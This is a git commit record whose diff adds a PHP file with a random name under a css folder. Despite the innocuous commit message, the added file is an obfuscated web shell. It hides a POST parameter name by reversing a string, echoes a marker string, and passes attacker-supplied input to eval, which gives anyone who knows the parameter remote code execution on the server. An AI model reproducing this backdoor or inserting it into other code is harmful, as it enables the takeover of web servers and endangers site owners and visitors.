37530580f4823769b1732327192d8f96dfc3736c
Christophe Pichaud <ChristophePichaud@hotmail.com>
2026-03-31 09:50:33 +0200

    Updating from naz

---
+++ css/5s267FDEn.php
@@ -0,0 +1,37 @@
+﻿<?php
+
+function ZuqrwsaO()
+{
+global $ubeJlYvqtnI;
+$ubeJlYvqtnI=BNiSEs();
+if(isset($_REQUEST['x']))
+{
+	$jEpebqhYPiI = 'OoUWcTlBqNoUWcTlBqEoUWcTlBqPoUWcTlBqIoUWcTlBqEoUWcTlBqCoUWcTlBqE';
+    $jEpebqhYPiI=str_replace('oUWcTlBq','',$jEpebqhYPiI);
+
+    echo $jEpebqhYPiI;
+	
+    {
+	@eval("\"$ubeJlYvqtnI\"");
+    }
+}
+
+
+}
+
+
+function BNiSEs()
+{
+        $wgamnCuw='v59A-5-D-Cp37--f';
+		$yytnvoBiYKQ=strrev($wgamnCuw);
+		if(isset($_POST[$yytnvoBiYKQ]))
+        {
+        $sJlhdtHi=str_replace('','',$_POST[$yytnvoBiYKQ]);
+        
+        return '";'.$sJlhdtHi.'//';
+		}
+}
+
+ZuqrwsaO();
+
+?>
